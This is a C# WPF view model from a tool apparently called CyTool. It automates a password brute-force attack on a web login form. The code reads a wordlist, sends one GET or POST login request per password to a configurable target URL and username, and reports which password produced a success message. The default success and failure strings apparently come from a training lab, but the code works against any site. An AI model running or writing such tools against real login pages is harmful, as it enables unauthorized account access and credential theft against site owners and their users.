using System;
using System.ComponentModel;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Input;
using CyTool.Commands;
using CyTool.Models;

namespace CyTool.ViewModels
{
    public class BruteForceViewModel : INotifyPropertyChanged
    {
        private BruteForceModel _model;
        private string _outputLog;
        private bool _isRunning;
        private CancellationTokenSource _cts;
        public event PropertyChangedEventHandler PropertyChanged;

        public BruteForceViewModel()
        {
            _model = new BruteForceModel();
            StartBruteForceCommand = new RelayCommand(OnStartBruteForce, () => !IsRunning);
            StopBruteForceCommand = new RelayCommand(OnStopBruteForce, () => IsRunning);

            RequestMethod = "GET";
            UsernameParam = "username";
            PasswordParam = "password";
            LoginParam = "Login";
            SuccessIndicator = "Welcome to the password protected area";
            FailureIndicator = "Username and/or password incorrect";
            AdditionalQuery = "";
            LogoutUrl = "";
        }

        public string TargetUrl
        {
            get => _model.TargetUrl;
            set { _model.TargetUrl = value; OnPropertyChanged(); }
        }

        public string Username
        {
            get => _model.Username;
            set { _model.Username = value; OnPropertyChanged(); }
        }

        public string OutputLog
        {
            get => _outputLog;
            set { _outputLog = value; OnPropertyChanged(); }
        }

        public bool IsRunning
        {
            get => _isRunning;
            set { _isRunning = value; OnPropertyChanged(); CommandManager.InvalidateRequerySuggested(); }
        }

        public string RequestMethod { get; set; }
        public string UsernameParam { get; set; }
        public string PasswordParam { get; set; }
        public string LoginParam { get; set; }
        public string SuccessIndicator { get; set; }
        public string FailureIndicator { get; set; }
        public string AdditionalQuery { get; set; }
        public string LogoutUrl { get; set; }

        public ICommand StartBruteForceCommand { get; }
        public ICommand StopBruteForceCommand { get; }

        private async void OnStartBruteForce() => await StartBruteForceAsync();

        private async Task StartBruteForceAsync()
        {
            if (string.IsNullOrWhiteSpace(TargetUrl) || string.IsNullOrWhiteSpace(Username))
            {
                AppendOutput("Please fill in all fields (URL and Username).");
                return;
            }

            if (!TargetUrl.EndsWith("/"))
                TargetUrl += "/";

            string projectDir = Directory.GetParent(AppDomain.CurrentDomain.BaseDirectory)
                .Parent.Parent.Parent.FullName;
            string passwordFilePath = Path.Combine(projectDir, "Resources", "passwords.txt");
            if (!File.Exists(passwordFilePath))
            {
                AppendOutput("Password file not found: " + passwordFilePath);
                return;
            }

            string[] passwords = await Task.Run(() => File.ReadAllLines(passwordFilePath));
            IsRunning = true;
            _cts = new CancellationTokenSource();
            var token = _cts.Token;
            AppendOutput($"Starting brute force against {TargetUrl} for user '{Username}' using {RequestMethod}...");

            var handler = new HttpClientHandler { AllowAutoRedirect = true, CookieContainer = new CookieContainer() };
            using (HttpClient client = new HttpClient(handler) { Timeout = TimeSpan.FromSeconds(30) })
            {
                foreach (var pwd in passwords)
                {
                    if (token.IsCancellationRequested)
                    {
                        AppendOutput("Brute force cancelled.");
                        break;
                    }

                    if (!string.IsNullOrEmpty(LogoutUrl))
                    {
                        try { await client.GetAsync(LogoutUrl, token); } catch { }
                    }

                    HttpResponseMessage response = null;
                    if (RequestMethod.ToUpper() == "GET")
                    {
                        string url = $"{TargetUrl}?{UsernameParam}={Uri.EscapeDataString(Username)}" +
                                     $"&{PasswordParam}={Uri.EscapeDataString(pwd)}" +
                                     $"&{LoginParam}={Uri.EscapeDataString(LoginParam)}";
                        if (!string.IsNullOrEmpty(AdditionalQuery))
                            url += $"&{AdditionalQuery}";
                        response = await client.GetAsync(url, token);
                    }
                    else
                    {
                        var formData = new System.Collections.Generic.List<KeyValuePair<string, string>>
                        {
                            new KeyValuePair<string, string>(UsernameParam, Username),
                            new KeyValuePair<string, string>(PasswordParam, pwd)
                        };
                        if (!string.IsNullOrEmpty(LoginParam))
                            formData.Add(new KeyValuePair<string, string>(LoginParam, LoginParam));
                        if (!string.IsNullOrEmpty(AdditionalQuery))
                        {
                            var parts = AdditionalQuery.Split('&');
                            foreach (var part in parts)
                            {
                                var kv = part.Split('=');
                                if (kv.Length == 2)
                                    formData.Add(new KeyValuePair<string, string>(kv[0], kv[1]));
                            }
                        }
                        response = await client.PostAsync(TargetUrl, new FormUrlEncodedContent(formData), token);
                    }

                    string responseBody = await response.Content.ReadAsStringAsync();
                    if (responseBody.Contains(SuccessIndicator))
                    {
                        AppendOutput($"Password found: {pwd}");
                        break;
                    }
                    else if (responseBody.Contains(FailureIndicator))
                    {
                        AppendOutput($"Failed: {pwd}");
                    }
                    else
                    {
                        string snippet = responseBody.Length > 100 ? responseBody.Substring(0, 100) : responseBody;
                        AppendOutput($"Unexpected response for '{pwd}': {snippet}...");
                    }
                    await Task.Delay(500);
                }
            }
            IsRunning = false;
        }

        private void OnStopBruteForce() => _cts?.Cancel();

        private void AppendOutput(string message) =>
            OutputLog += $"{DateTime.Now:HH:mm:ss} - {message}\r\n";

        protected void OnPropertyChanged([CallerMemberName] string propertyName = null) =>
            PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(propertyName));
    }
}
